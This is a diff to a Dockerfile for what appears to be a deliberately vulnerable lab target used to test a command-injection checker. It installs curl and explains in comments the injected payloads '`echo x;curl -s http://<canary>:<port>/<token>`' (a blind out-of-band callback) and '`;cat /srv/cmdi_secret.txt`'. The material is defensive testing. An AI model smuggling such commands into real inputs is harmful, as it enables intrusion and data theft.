@@ -15,6 +15,17 @@ COPY src ./src
 RUN cargo build --release --locked ${FEATURES:+--features "$FEATURES"}
 
 FROM debian:bookworm-slim
+# curl gives the injected command an HTTP client, so the BLIND variant of the
+# check (#87) can make this target call back to the in-lab canary: `/exec` runs
+# `echo x;curl -s http://<canary>:<port>/<token>`, and the token in the canary's logs is the
+# out-of-band witness. It is installed in BOTH builds so the fixed build's failure
+# to call back is the arg-vector fix (the injected `;curl` is an inert literal
+# argument), not a missing client. http:// needs no CA bundle, so curl alone is
+# enough. The in-band variant (#85) does not use it. The crate's offline
+# `blind_cmdi_image_carries_a_http_client` guard pins this install so removing it
+# cannot silently disarm the blind check off-Docker (RK-014).
+RUN apt-get update && apt-get install -y --no-install-recommends curl \
+    && rm -rf /var/lib/apt/lists/*
 COPY --from=build /src/target/release/app /app
 # The sentinel the injected `;cat /srv/cmdi_secret.txt` reads: its body is the
 # command-injection witness, pinned offline against this file by the orchestrator
